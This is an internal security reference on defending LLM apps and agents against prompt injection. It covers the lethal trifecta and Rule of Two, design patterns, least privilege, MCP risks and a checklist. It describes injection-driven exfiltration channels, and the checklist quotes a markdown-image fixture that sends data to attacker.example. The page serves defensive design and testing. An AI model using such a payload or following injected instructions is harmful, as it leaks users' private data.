---
id: security/llm-agent-security
title: LLM application and agent security (prompt injection, lethal trifecta, MCP)
area: security
read_when: building an LLM feature, RAG, an agent with tools, an MCP server/client, or reviewing AI coding-agent permissions
verified: 2026-10-10
revisit_days: 180
sources: ["https://genai.owasp.org/llm-top-10/", "https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/", "https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/", "https://simonwillison.net/2025/Nov/2/new-prompt-injection-papers/", "https://arxiv.org/abs/2506.08837", "https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/", "https://arxiv.org/abs/2503.18813", "https://modelcontextprotocol.io/docs/2025-11-25/tutorials/security/security_best_practices", "https://cheatsheetseries.owasp.org/cheatsheets/AI_Agent_Security_Cheat_Sheet.html", "https://cheatsheetseries.owasp.org/cheatsheets/MCP_Security_Cheat_Sheet.html"]
---
# LLM application and agent security

**Prompt injection is not solved.** Any text the model reads (web pages, emails, documents, tool results, issue comments, file contents, images) can contain instructions the model may follow. No prompt, filter or "guard model" is a reliable defence. Security therefore comes from **architecture: limiting what a model that has been tricked can do.** Detailed agent rules for this repo's own AI tooling live in the agent-security pack; this ref is for products you build.

## Decision guide

**1. Check the lethal trifecta / Agents Rule of Two first.** Simon Willison's lethal trifecta: an agent with (a) access to private data, (b) exposure to untrusted content and (c) the ability to communicate externally can be made to exfiltrate data. Meta's "Agents Rule of Two" (31 Oct 2025) generalises it: within one session an agent should have no more than two of [A] processing untrustworthy input, [B] access to sensitive systems or private data, [C] changing state or communicating externally; if it needs all three, it must not run autonomously (human approval or another reliable validation).

| Agent | A untrusted input | B private data | C external action | Verdict |
|---|---|---|---|---|
| Support bot reading tickets, answering from docs only | yes | no | reply to that user only | OK |
| Email assistant that reads inbox and can send mail | yes | yes | yes | **all three**: require human approval of each send, or drop one leg |
| Code agent on a repo with prod deploy keys | yes (issues, deps) | yes | yes | remove prod credentials; deploy via reviewed pipeline |

Exfiltration channels are subtle: rendering a markdown image or link with data in the URL, fetching a URL, writing to a shared doc, opening a PR. Block or allow-list them.

**2. Use a design pattern that resists injection** (Beurer-Kellner et al. 2025, arXiv 2506.08837):
- **Action-selector**: the model only picks from fixed actions; tool output never goes back into the model.
- **Plan-then-execute**: plan fixed before reading untrusted data; data cannot add steps (can still corrupt arguments).
- **LLM map-reduce**: isolated sub-calls process each untrusted item and return constrained output (e.g. boolean, enum) to the coordinator.
- **Dual LLM**: a privileged model never sees untrusted text; a quarantined model processes it and returns symbolic references.
- **Code-then-execute**: the model writes a program up front (CaMeL, arXiv 2503.18813, extracts control and data flow from the trusted query so retrieved data "can never impact the program flow", plus capabilities on data).
- **Context-minimization**: remove the user's original prompt or untrusted content from context before later steps.

**3. Least privilege for tools (OWASP LLM06 Excessive Agency, ASI02 Tool Misuse, ASI03 Identity & Privilege Abuse):** narrow tools (`refund_order(order_id)` with server-side limits, not `run_sql`); per-user, short-lived credentials so the agent can never exceed the calling user's rights; human confirmation for irreversible or money-moving actions, showing the exact parameters; rate and spend limits (LLM10 Unbounded Consumption).

**4. Treat model output as untrusted (LLM05 Improper Output Handling):** encode before HTML, parameterize before SQL, never `eval`/shell it, validate tool arguments with schemas, sandbox generated code (no network, no secrets, resource limits) — ASI05 Unexpected Code Execution.

**5. Data and memory:** no secrets in system prompts (LLM07 System Prompt Leakage: assume the prompt leaks); RAG retrieval must apply the **user's** authorization to documents (LLM08 Vector and Embedding Weaknesses); persistent memory is an injection persistence vector (ASI06 Memory & Context Poisoning) — scope it per user, let users inspect/delete it, and do not store tool output as trusted facts.

**6. MCP (Model Context Protocol) specifics** (MCP security best practices):
- **Token passthrough is forbidden**: "MCP servers MUST NOT accept any tokens that were not explicitly issued for the MCP server." Validate audience; use your own tokens to call downstream APIs.
- **Confused deputy** in OAuth proxy servers: per-client consent before redirecting to third-party authorization.
- **SSRF** via OAuth metadata/discovery URLs and tool fetches; **session hijacking** (sessions are not authentication; bind to user, use random ids); **local MCP server compromise** (a local server runs with your privileges: show the exact command before install, sandbox it, prefer stdio with minimal permissions); **scope minimization**.
- Treat third-party MCP servers and tool descriptions as supply chain (ASI04): pin versions, review tool descriptions for hidden instructions, keep MCP configs with secrets out of git.

**OWASP lists to review against:** LLM Top 10 2025 — LLM01 Prompt Injection, LLM02 Sensitive Information Disclosure, LLM03 Supply Chain, LLM04 Data and Model Poisoning, LLM05 Improper Output Handling, LLM06 Excessive Agency, LLM07 System Prompt Leakage, LLM08 Vector and Embedding Weaknesses, LLM09 Misinformation, LLM10 Unbounded Consumption. Agentic Top 10 2026 — ASI01 Agent Goal Hijack … ASI07 Insecure Inter-Agent Communication, ASI08 Cascading Failures, ASI09 Human-Agent Trust Exploitation, ASI10 Rogue Agents.

## Anti-patterns
- "We told the model to ignore instructions in documents" as the defence.
- One agent with inbox/drive access, web browsing and send/post tools, running unattended.
- Agent credentials broader than the user's (service account with admin) or production keys in agent environments.
- Rendering model output as raw HTML/markdown with remote images (zero-click exfiltration).
- RAG index shared across tenants with filtering done by the prompt.
- Installing community MCP servers with `npx some-server@latest` and broad tokens.

## Checks
- [ ] Threat model has a trifecta/Rule-of-Two table for each agent and session type; any "all three" path requires human approval (test).
- [ ] Tools are narrow, schema-validated, and enforce the calling user's authorization server-side (authz matrix covers tool endpoints).
- [ ] Output encoding: model output rendered with sanitization; remote images/links in output disabled or allow-listed (test with an injection fixture that tries `![x](https://attacker.example/?d=...)`).
- [ ] Injection test corpus (from the OWASP prompt-injection sheet once signed off, plus your own) runs in CI against the agent; success = no forbidden tool call, not "model refused".
- [ ] Spend/rate limits per user and per agent run; alerts on anomalies.
- [ ] MCP servers: audience-validated tokens, pinned versions, configs with secrets git-ignored.

## Sources
- https://genai.owasp.org/llm-top-10/ (LLM Top 10 2025)
- https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/ (ASI01–ASI10)
- https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/
- https://simonwillison.net/2025/Nov/2/new-prompt-injection-papers/ (quotes Meta's Agents Rule of Two, 31 Oct 2025)
- https://arxiv.org/abs/2506.08837 and https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/ (six design patterns)
- https://arxiv.org/abs/2503.18813 (CaMeL)
- https://modelcontextprotocol.io/docs/2025-11-25/tutorials/security/security_best_practices
- https://cheatsheetseries.owasp.org/cheatsheets/AI_Agent_Security_Cheat_Sheet.html
- https://cheatsheetseries.owasp.org/cheatsheets/MCP_Security_Cheat_Sheet.html
